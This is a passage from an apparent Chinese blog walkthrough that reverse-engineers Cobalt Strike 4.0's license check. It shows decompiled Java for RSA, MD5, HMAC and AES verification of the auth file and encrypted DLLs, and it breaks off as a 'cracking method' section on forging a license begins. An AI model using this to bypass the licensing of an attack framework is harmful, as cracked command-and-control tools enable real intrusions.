class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 解密函数解析，主要是涉及 RSA 解密和 gzip 解压相关操作，这里作者其实是在文件头加了四个字节</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthCrypto</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> Cipher cipher;</span><br><span class="line">   <span class="keyword">public</span> Key pubkey = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">protected</span> String error = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">AuthCrypto</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 构造方法中生成了一个 RSA/ECB/PKCS1Padding 的 ciper</span></span><br><span class="line">         <span class="keyword">this</span>.cipher = Cipher.getInstance(<span class="string">"RSA/ECB/PKCS1Padding"</span>);</span><br><span class="line">         <span class="keyword">this</span>.load();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">         <span class="keyword">this</span>.error = <span class="string">"Could not initialize crypto"</span>;</span><br><span class="line">         MudgeSanity.logException(<span class="string">"AuthCrypto init"</span>, var2, <span class="keyword">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Load() -&gt; 加载公钥，验证哈希</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">load</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// RSA 解密常规初始化操作</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 读取 authkey.pub</span></span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte1 = CommonUtils.readAll(CommonUtils.class.getClassLoader().getResourceAsStream(<span class="string">"resources/authkey.pub"</span>));</span><br><span class="line">         <span class="comment">// MD5 操作</span></span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte2 = CommonUtils.MD5(arrayOfByte1);</span><br><span class="line">         <span class="comment">// 对比 hash，以校验 authkey.pub 文件是否符合要求</span></span><br><span class="line">         <span class="keyword">if</span> (!<span class="string">"8bb4df00c120881a1945a43e2bb2379e"</span>.equals(CommonUtils.toHex(arrayOfByte2))) &#123;</span><br><span class="line">            <span class="comment">// 无效的授权文件</span></span><br><span class="line">            CommonUtils.print_error(<span class="string">"Invalid authorization file"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         X509EncodedKeySpec localX509EncodedKeySpec = <span class="keyword">new</span> X509EncodedKeySpec(arrayOfByte1);</span><br><span class="line">         KeyFactory localKeyFactory = KeyFactory.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">         <span class="comment">// RSA 公钥</span></span><br><span class="line">         <span class="keyword">this</span>.pubkey = localKeyFactory.generatePublic(localX509EncodedKeySpec);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">         <span class="keyword">this</span>.error = <span class="string">"Could not deserialize authpub.key"</span>;</span><br><span class="line">         MudgeSanity.logException(<span class="string">"authpub.key deserialization"</span>, var5, <span class="keyword">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">error</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 解密 cobaltstrike.auth 的主函数，如果返回不为 null，则校验通过。</span></span><br><span class="line"><span class="comment">   * */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] paramArrayOfByte) &#123;</span><br><span class="line">      <span class="comment">// RSA 解密，并返回 byte 数组</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">this</span>._decrypt(paramArrayOfByte);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (arrayOfByte1.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arrayOfByte1;</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 将解密好的数据，交给了 DataParser</span></span><br><span class="line">            DataParser localDataParser = <span class="keyword">new</span> DataParser(arrayOfByte1);</span><br><span class="line">            localDataParser.big();</span><br><span class="line">            <span class="comment">// byte 数组转有符号 Int -&gt; 取头部 4个字节判断文件头是否正确，这里并不是标准的 gzip头 -&gt; byte[] b = &#123;-54, -2, -64, -45&#125;</span></span><br><span class="line">            <span class="comment">// 注：有符号数最高位为1，表示负数；最高位为0，表示正数</span></span><br><span class="line">            <span class="keyword">int</span> i = localDataParser.readInt();</span><br><span class="line">            <span class="keyword">if</span> (i == -<span class="number">889274181</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.error = <span class="string">"pre-4.0 authorization file. Run update to get new file"</span>;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i != -<span class="number">889274157</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.error = <span class="string">"bad header"</span>;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// 处理文件头并解压</span></span><br><span class="line">               <span class="keyword">int</span> j = localDataParser.readShort();</span><br><span class="line">               <span class="keyword">byte</span>[] arrayOfByte2 = localDataParser.readBytes(j);</span><br><span class="line">               <span class="keyword">return</span> arrayOfByte2;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception localException) &#123;</span><br><span class="line">         <span class="keyword">this</span>.error = localException.getMessage();</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 这个函数需要注意的是，代入的数据是使用 RSA 公钥进行解密的，然后返回解密后的数据。</span></span><br><span class="line"><span class="comment">    * 因此在生成 .auth 的时候，应该使用密钥进行加密。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">byte</span>[] _decrypt(<span class="keyword">byte</span>[] paramArrayOfByte) &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">this</span>.pubkey == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="keyword">this</span>.cipher) &#123;</span><br><span class="line">               <span class="keyword">this</span>.cipher.init(<span class="number">2</span>, <span class="keyword">this</span>.pubkey);</span><br><span class="line">               arrayOfByte = <span class="keyword">this</span>.cipher.doFinal(paramArrayOfByte);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> arrayOfByte;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception localException) &#123;</span><br><span class="line">         <span class="keyword">this</span>.error = localException.getMessage();</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合上述两个代码，如果验证通过，则可以打开客户端页面。这与 3.X 的认证大致相同。</p><h4 id="3-4、SleevedResource-类"><a href="#3-4、SleevedResource-类" class="headerlink" title="3.4、SleevedResource 类"></a>3.4、SleevedResource 类</h4><p>与 3.X 不同的是，4.X 在 <code>Authorization()</code> 中新增了一个新的验证 <code>SleevedResource.Setup()</code>。该验证的大致流程为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、使用 .auth 文件的一部分数据作为一个 key，将该 key 再进行处理拆分；</span><br><span class="line"><span class="number">2</span>、程序调用内置的 dll 文件；</span><br><span class="line"><span class="number">3</span>、读取 dll 文件，对 dll 文件进行处理拆分；</span><br><span class="line"><span class="number">4</span>、使用拆分的 key 分别对拆分的 dll 分别进行 hmac 摘要验证及 AES 解密。</span><br><span class="line"><span class="number">5</span>、最后执行 dll。</span><br></pre></td></tr></table></figure><p>跟进 <code>SleevedResource.Setup(arrayOfByte3);</code> 看一看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SleevedResource</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> SleevedResource singleton;</span><br><span class="line">   <span class="keyword">private</span> SleeveSecurity data = <span class="keyword">new</span> SleeveSecurity();</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Setup</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span> </span>&#123;</span><br><span class="line">      singleton = <span class="keyword">new</span> SleevedResource(paramArrayOfByte);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] readResource(String paramString) &#123;</span><br><span class="line">      <span class="keyword">return</span> singleton._readResource(paramString);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="title">SleevedResource</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 将 16 个字节的数据传入 SleeveSecurity.registerKey() 中</span></span><br><span class="line">      <span class="keyword">this</span>.data.registerKey(paramArrayOfByte);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 这是一个读取文件，并对文件进行解密的函数方法</span></span><br><span class="line"><span class="comment">    * paramString 是一个文件名（文件相对路径）</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] _readResource(String paramString) &#123;</span><br><span class="line">      <span class="comment">// strrep 是将 paramString 文件路径中的 resources/ 替换成 sleeve/</span></span><br><span class="line">      String str = CommonUtils.strrep(paramString, <span class="string">"resources/"</span>, <span class="string">"sleeve/"</span>);</span><br><span class="line">      <span class="comment">// 替换之后实际上是读取 jar 包中 sleeve 目录下的文件，返回一个 byte[]</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte1 = CommonUtils.readResource(str);</span><br><span class="line">      <span class="keyword">if</span> (arrayOfByte1.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">         <span class="comment">// 将读取的文件 byte[] 代入解密阶段</span></span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte2 = <span class="keyword">this</span>.data.decrypt(arrayOfByte1);</span><br><span class="line">         <span class="keyword">return</span> arrayOfByte2;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// 不经过替换，直接读取源文件(sleeve 中不存在的文件，在 resources 中存在)</span></span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte3 = CommonUtils.readResource(paramString);</span><br><span class="line">         <span class="keyword">if</span> (arrayOfByte3.length == <span class="number">0</span>) &#123;</span><br><span class="line">            CommonUtils.print_error(<span class="string">"Could not find sleeved resource: "</span> + paramString + <span class="string">" [ERROR]"</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CommonUtils.print_stat(<span class="string">"Used internal resource: "</span> + paramString);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> arrayOfByte3;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现调用 <code>SleevedResource</code> 类的构造函数并将该 byte 数组传递给了 <code>dns.SleeveSecurity</code> 的 <code>registerKey()</code> 方法，继续跟进该方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerKey</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">         MessageDigest localMessageDigest = MessageDigest.getInstance(<span class="string">"SHA-256"</span>);</span><br><span class="line">         <span class="comment">// 首先利用我们的 array，获取了一个 digest，大小是 256</span></span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte1 = localMessageDigest.digest(paramArrayOfByte);</span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte2 = Arrays.copyOfRange(arrayOfByte1, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte3 = Arrays.copyOfRange(arrayOfByte1, <span class="number">16</span>, <span class="number">32</span>);</span><br><span class="line">         <span class="comment">// 取了 arrayOfByte1 的 0-16 作为 AES 的加密 key</span></span><br><span class="line">         <span class="keyword">this</span>.key = <span class="keyword">new</span> SecretKeySpec(arrayOfByte2, <span class="string">"AES"</span>);</span><br><span class="line">         <span class="comment">// 取了arrayOfByte1 的 16-32 作为 Hmac 的加密 key</span></span><br><span class="line">         <span class="keyword">this</span>.hash_key = <span class="keyword">new</span> SecretKeySpec(arrayOfByte3, <span class="string">"HmacSHA256"</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">         var8.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嗯，到这里没见到往下走的验证了，估摸着第一轮验证就结束了。</p><p>此时启动 <code>teamserver</code>，则会在 <code>temserver</code>  中看到一个错误：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">-</span>] [Sleeve] Bad HMAC <span class="keyword">on</span> xxxxx <span class="keyword">byte</span> message <span class="keyword">from</span> resource</span><br></pre></td></tr></table></figure><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/微信图片_20200730195204.jpg" alt=""></p><p>注意：此验证是在调用 CS 内置 <code>EXE/DLL</code> 时所需要的，当验证不通过时，则出现该错误。因此当在绕过了开头的限制，则可以开启客户端，只不过功能受影响；只有该验证顺利通过，才是完全授权验证。</p><h4 id="3-4、decrypt-方法调用链"><a href="#3-4、decrypt-方法调用链" class="headerlink" title="3.4、decrypt() 方法调用链"></a>3.4、decrypt() 方法调用链</h4><p>我们搜索该错误，在 <code>SleeveSecurity.decrypt()</code> 中找到。</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-30_14-28-48.png" alt=""></p><p>我们依次查看调用链：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-30_20-39-47.png" alt=""></p><p>我们在 <code>SleevedResource</code> 中看到此 <code>decrypt()</code> 方法的调用。而 <code>readResource()</code> 则调用了 <code>_readResource()</code>。我们再查看关于 <code>readResource()</code>  的调用：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-30_21-02-40.png" alt=""></p><p>我们就此挑选比较干净的调用例子来分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] export_dll() &#123;</span><br><span class="line">    <span class="comment">// 判断框架位数，之后传入一个文件</span></span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = SleevedResource.readResource(<span class="keyword">this</span>.x64 ? <span class="string">"resources/browserpivot.x64.dll"</span> : <span class="string">"resources/browserpivot.dll"</span>);</span><br><span class="line">    String str = CommonUtils.bString(arrayOfByte);</span><br><span class="line">    Packer packer = <span class="keyword">new</span> Packer();</span><br><span class="line">    packer.little();</span><br><span class="line">    packer.addShort(<span class="keyword">this</span>.port);</span><br><span class="line">    <span class="keyword">int</span> i = str.indexOf(<span class="string">"COBALTSTRIKE"</span>);</span><br><span class="line">    str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), i);</span><br><span class="line">    <span class="keyword">return</span> CommonUtils.toBytes(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时回头查看 <code>_readResource()</code> 函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 这是一个读取文件，并对文件进行解密的函数方法</span></span><br><span class="line"><span class="comment">* paramString 是一个文件名（文件相对路径）</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] _readResource(String paramString) &#123;</span><br><span class="line">   <span class="comment">// strrep 是将 paramString 文件路径中的 resources/ 替换成 sleeve/</span></span><br><span class="line">   String str = CommonUtils.strrep(paramString, <span class="string">"resources/"</span>, <span class="string">"sleeve/"</span>);</span><br><span class="line">   <span class="comment">// 替换之后实际上是读取 jar 包中 sleeve 目录下的文件</span></span><br><span class="line">   <span class="keyword">byte</span>[] arrayOfByte1 = CommonUtils.readResource(str);</span><br><span class="line">   <span class="keyword">if</span> (arrayOfByte1.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">      <span class="comment">// 将读取的文件 byte[] 代入解密阶段</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte2 = <span class="keyword">this</span>.data.decrypt(arrayOfByte1);</span><br><span class="line">      <span class="keyword">return</span> arrayOfByte2;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 不经过替换，直接读取源文件(sleeve 中不存在的文件，在 resources 中存在)</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte3 = CommonUtils.readResource(paramString);</span><br><span class="line">      <span class="keyword">if</span> (arrayOfByte3.length == <span class="number">0</span>) &#123;</span><br><span class="line">         CommonUtils.print_error(<span class="string">"Could not find sleeved resource: "</span> + paramString + <span class="string">" [ERROR]"</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         CommonUtils.print_stat(<span class="string">"Used internal resource: "</span> + paramString);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> arrayOfByte3;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重点来看这个解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 该函数是从 license文件中获取的 2 个 key 进行一些列的验证解密；</span></span><br><span class="line"><span class="comment">* 最终将加密的 dll 文件进行解密返回。</span></span><br><span class="line"><span class="comment">* paramArrayOfbyte 是源文件读取出来的 byte[] 数据</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] paramArrayOfbyte) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 取 paramArrayOfbyte 的开头至倒数 -16 的数据，这段数据是 dll 的主体数据</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte1 = Arrays.copyOfRange(paramArrayOfbyte, <span class="number">0</span>, paramArrayOfbyte.length - <span class="number">16</span>);</span><br><span class="line">      <span class="comment">// 取 paramArrayOfbyte 的剩下的 16 位数据。</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte2 = Arrays.copyOfRange(paramArrayOfbyte, paramArrayOfbyte.length - <span class="number">16</span>, paramArrayOfbyte.length);</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte3 = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">         <span class="comment">// 先用我们在 license中生成的 hash_key 作为密钥，对 arrayOfByte1 进行摘要计算</span></span><br><span class="line">         <span class="keyword">this</span>.mac.init(<span class="keyword">this</span>.hash_key);</span><br><span class="line">         arrayOfByte3 = <span class="keyword">this</span>.mac.doFinal(arrayOfByte1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 取 arrayOfByte3 的前 16位数据</span></span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte4 = Arrays.copyOfRange(arrayOfByte3, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">// 两两对比，如果相等，则步入 else。该对比，主要防止 dll 被篡改。</span></span><br><span class="line">      <span class="keyword">if</span> (!MessageDigest.isEqual(arrayOfByte2, arrayOfByte4)) &#123;</span><br><span class="line">         CommonUtils.print_error(<span class="string">"[Sleeve] Bad HMAC on "</span> + paramArrayOfbyte.length + <span class="string">" byte message from resource"</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">byte</span>[] arrayOfByte5 = <span class="keyword">null</span>;</span><br><span class="line">         <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="comment">// 在对比成功后，将使用 key 对 dll主体内容数据进行 AES 解密</span></span><br><span class="line">            arrayOfByte5 = <span class="keyword">this</span>.do_decrypt(<span class="keyword">this</span>.key, arrayOfByte1);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         DataInputStream dataInputStream = <span class="keyword">new</span> DataInputStream(<span class="keyword">new</span> ByteArrayInputStream(arrayOfByte5));</span><br><span class="line">         <span class="keyword">int</span> i = dataInputStream.readInt();</span><br><span class="line">         <span class="keyword">int</span> j = dataInputStream.readInt();</span><br><span class="line">         <span class="keyword">if</span> (j &gt;= <span class="number">0</span> &amp;&amp; j &lt;= paramArrayOfbyte.length) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] var10 = <span class="keyword">new</span> <span class="keyword">byte</span>[j];</span><br><span class="line">            dataInputStream.readFully(var10, <span class="number">0</span>, j);</span><br><span class="line">            <span class="comment">// 最后返回解密后的文件，以便调用</span></span><br><span class="line">            <span class="keyword">return</span> var10;</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CommonUtils.print_error(<span class="string">"[Sleeve] Impossible message length: "</span> + j);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法要在初始验证阶段是不会进行调用的，为了方便调试，直接在 <code>registerKey()</code> 写个调用即可，比如：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-07-31_23-45-39.png" alt=""></p><p>我们只是捋清整个需要认证的过程，不细讨其他的东西，因此只需要知道 <code>cobaltstrike.auth</code> 文件的组成和用处即可。</p><h4 id="3-5、认证流程图"><a href="#3-5、认证流程图" class="headerlink" title="3.5、认证流程图"></a>3.5、认证流程图</h4><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/CS 4.X 认证流程图.png" alt=""></p><h3 id="0x04-破解方法"><a href="#0x04-破解方法" class="headerlink" title="0x04 破解方法"></a>0x04 破解方法</h3><p>理论上，穷举 <code>Authorization()</code> 中的 <code>arrayOfByte3</code> 有些不现实；因为逆着推回去，需要推出 hmac 的 key，AES 的 key，是我想多了。</p><p>因此，至少需要知道 <code>arrayOfByte3</code> 的值才可能正常运行成功。但在有这个关键 key 的前提下，我们可以这么做。</p><h4 id="4-1、重新生成-license"><a href="#4-1、重新生成-license" class="headerlink" title="4.1、重新生成 license"></a>4.1、重新生成 license</h4><p>也就是说，我们要伪造一个自己的授权文件的话， 只需要生成自己的 RSA 